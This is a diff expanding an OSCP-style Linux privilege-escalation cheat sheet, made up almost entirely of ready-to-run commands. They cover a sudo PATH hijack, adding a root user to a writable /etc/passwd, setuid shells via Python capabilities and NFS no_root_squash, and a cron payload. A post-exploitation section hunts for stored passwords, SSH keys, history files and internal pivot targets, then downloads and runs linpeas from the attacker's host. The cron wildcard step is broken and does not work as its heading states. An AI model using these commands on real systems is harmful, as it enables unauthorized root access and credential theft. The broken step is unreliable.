@@ -2,9 +2,9 @@
 # 05 – LINUX PRIVILEGE ESCALATION (OSCP 2025)
 ######################################################################
 
-===============================
-# 1. Basic Enumeration
-===============================
+======================================================================
+# 1. BASIC ENUMERATION
+======================================================================
 id
 whoami
 uname -a
@@ -14,88 +14,174 @@ sudo -l
 ss -tunlp
 ps aux
 
-===============================
-# 2. SUID Enumeration
-===============================
+# Check environment variables (PATH hijacking opportunities)
+echo $PATH
+
+# Logged-in users
+who
+w
+
+# Cron jobs
+cat /etc/crontab
+ls -la /etc/cron*
+
+
+======================================================================
+# 2. SUID ENUMERATION
+======================================================================
 find / -perm -4000 -type f 2>/dev/null
-for f in $(find / -perm -4000 -type f 2>/dev/null); do echo "[SUID] $f"; done
 
-# Check GTFOBins for every SUID binary.
+# Pretty-printed
+for f in $(find / -perm -4000 -type f 2>/dev/null); do 
+    echo "[SUID] $f"; 
+done
 
-===============================
-# 3. SGID Enumeration
-===============================
+# Check GTFOBins for each SUID binary.
+
+
+======================================================================
+# 3. SGID ENUMERATION
+======================================================================
 find / -perm -2000 -type f 2>/dev/null
 
-===============================
-# 4. Writable Directories (Privesc Candidates)
-===============================
+
+======================================================================
+# 4. WRITABLE DIRECTORIES (POTENTIAL PRIVESCS)
+======================================================================
 find / -writable -type d 2>/dev/null
 
-===============================
-# 5. PATH Hijacking Exploit
-===============================
+# Writable files
+find / -writable -type f 2>/dev/null
+
+
+======================================================================
+# 5. PATH HIJACKING EXPLOIT
+======================================================================
 echo "/bin/bash" > /tmp/ping
 chmod +x /tmp/ping
 export PATH=/tmp:$PATH
 sudo ping
 
-===============================
-# 6. Cronjob Wildcard Exploit
-===============================
+
+======================================================================
+# 6. CRONJOB WILDCARD EXPLOIT
+======================================================================
 echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /tmp/payload.sh
 touch /tmp/payload.sh
 touch /tmp/payload.sh
 
-Wait for cron → run:
+# After cron runs:
 /tmp/rootbash -p
 
-===============================
-# 7. /etc/passwd Writable (Root Salary)
-===============================
+
+======================================================================
+# 7. /etc/passwd WRITABLE (GET ROOT)
+======================================================================
 openssl passwd -1 "password"
 echo "root2:<hash>:0:0:root:/root:/bin/bash" >> /etc/passwd
 su root2
 
-===============================
-# 8. Capabilities Exploitation
-===============================
+
+======================================================================
+# 8. CAPABILITIES EXPLOITATION
+======================================================================
 getcap -r / 2>/dev/null
 
-# Example Python capability:
-/usr/bin/python3 = cap_setuid+ep
-
+# Example: Python has cap_setuid
+# /usr/bin/python3 = cap_setuid+ep
 python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 
-===============================
-# 9. NFS No_root_squash Privesc
-===============================
+
+======================================================================
+# 9. NFS NO_ROOT_SQUASH PRIVESC
+======================================================================
 # On attacker:
 mkdir /tmp/nfsroot
 mount -o rw $targetip:/export /tmp/nfsroot
 
-# Place SUID binary:
 cp /bin/bash /tmp/nfsroot/bash
 chmod +s /tmp/nfsroot/bash
 
-# On target:
+# On victim:
 ./bash -p
 
-===============================
-# 10. Exploitable Services Running as Root
-===============================
+
+======================================================================
+# 10. EXPLOITABLE SERVICES RUNNING AS ROOT
+======================================================================
 ps aux | grep root
 ss -tunlp
 
-Look for custom scripts or binaries owned by root.
+# Look for:
+# - custom scripts
+# - backups
+# - service configs
+# - dev environments
 
-===============================
-# 11. LinPEAS (Full Automation)
-===============================
+
+======================================================================
+# 11. POST-EXPLOIT: CREDENTIAL & INFO HUNTING
+======================================================================
+
+###############################
+# Search for password strings
+###############################
+grep -Ri "password" /etc 2>/dev/null
+grep -Ri "password" /home 2>/dev/null
+grep -Ri "pass" /var/www 2>/dev/null
+
+###############################
+# Look for SSH private keys
+###############################
+find / -name "id_rsa" 2>/dev/null
+find / -name "*.pem" 2>/dev/null
+
+###############################
+# History files
+###############################
+cat ~/.bash_history
+cat /home/*/.bash_history 2>/dev/null
+
+###############################
+# Backups
+###############################
+find / -name "*.bak" 2>/dev/null
+find / -name "*.old" 2>/dev/null
+find / -name "*.backup" 2>/dev/null
+
+###############################
+# Writable config files
+###############################
+find /etc -writable -type f 2>/dev/null
+
+###############################
+# Look for credentials in Apache / Nginx
+###############################
+grep -Ri "Auth" /etc/apache2 2>/dev/null
+grep -Ri "password" /etc/nginx 2>/dev/null
+
+
+======================================================================
+# 12. NETWORK ENUM FROM INSIDE THE BOX
+======================================================================
+ip a
+route -n
+cat /etc/resolv.conf
+arp -a
+ss -tulnp
+
+# Discover internal network pivot targets
+nmap -sn 10.0.0.0/24
+nmap -Pn -p 22,80,445 10.0.0.0/24
+
+
+======================================================================
+# 13. AUTOMATED ENUM (LAST RESORT)
+======================================================================
 wget http://$localip/linpeas.sh -O /tmp/linpeas.sh
 chmod +x /tmp/linpeas.sh
 /tmp/linpeas.sh
 
 ######################################################################
-# END OF LINUX PRIVESC
+# END OF LINUX PRIVESC (COMPLETE + POST-EXPLOIT)
 ######################################################################
